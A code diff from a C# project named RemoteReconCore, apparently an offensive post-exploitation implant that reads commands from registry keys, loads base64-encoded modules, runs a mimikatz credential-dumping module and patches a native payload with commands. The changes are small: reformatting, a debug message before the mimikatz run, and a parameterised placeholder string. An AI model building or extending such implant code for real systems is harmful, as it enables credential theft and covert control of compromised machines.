@@ -73,8 +73,12 @@ namespace RemoteReconCore
                         Console.WriteLine("Writing Screenshot command Result");
 #endif
                         rrbase.SetValue(resultkey, result.Key, RegistryValueKind.DWord);
-                        if (result.Key == 0) rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
-                        else rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+
+                        if (result.Key == 0)
+                            rrbase.SetValue(screenshotkey, result.Value, RegistryValueKind.String);
+                        else
+                            rrbase.SetValue(runkey, result.Value, RegistryValueKind.String);
+
                         rrbase.SetValue(commandkey, 0);
                         rrbase.SetValue(argumentkey, "");
                         rrbase.SetValue(runkey, "");
@@ -257,6 +261,9 @@ namespace RemoteReconCore
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                 string decoded = Encoding.ASCII.GetString(Convert.FromBase64String((string)command.Value));
                 mimikatz mk = new mimikatz(decoded, mod);
+#if DEBUG 
+                Console.WriteLine("Executing mimikatz module");
+#endif
                 result = mk.Run();
             }
         }
@@ -304,13 +311,13 @@ namespace RemoteReconCore
         }
         
         //Helper function to patch the Native module with the appropriate command
-        public static byte[] PatchRemoteReconNative(string cmd)
+        public static byte[] PatchRemoteReconNative(string cmd, string stringtoreplace)
         {
             byte[] cmdBytes = Encoding.ASCII.GetBytes(cmd);
             byte[] modCopy = mod;
             int index = 0;
             string moduleString = Encoding.ASCII.GetString(mod);
-            index = moduleString.IndexOf("Replace-Me  ");
+            index = moduleString.IndexOf(stringtoreplace);
 
             if(index == 0)
                 return new byte[1] { 0 };
